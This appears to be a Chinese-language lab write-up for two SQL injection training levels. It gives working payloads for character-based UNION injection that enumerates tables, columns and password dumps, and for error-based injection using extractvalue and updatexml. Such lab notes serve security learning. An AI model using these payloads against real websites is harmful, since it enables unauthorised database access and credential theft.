less1:字符型注入

传入参数/?id=1'报错，判断由于’闭合了查询的引号导致报错

/?id=1' order by 1,2,3,4--+判断回显行数，4时报错，行数为3

/?id=-1' union select 1,2,3 --+ 修改有回显的行为需要查询的数据

/?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+

爆出当前页面数据库的表名：emails,referers,uagents,users

/?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'--+

爆出列名：id,username,password

/?id=-1' union select 1,2,group_concat(password) from users--+

爆出所有的密码

### less5:报错注入

正常不显示数据，但是会显示报错，`extractvalue(1,concat(0x5c,(select database())));`使用此函数0x5c,0x7e引起报错，返回database()的非法数据

注意extractvalue()最多输出32个字符需要搭配substr()截断使用

如：`extractvalue(1,concat(0x5c,substr((select database()),-20)));` 输出后20位

`/?id=-1%27%20and%20updatexml(1,concat(0x7e,database(),0x7e),1)%23`

成功爆出数据库名security

`updatexml(1,concat(0x7e,database(),0x7e,user()),1)` 同样这个函数也是相同的效果
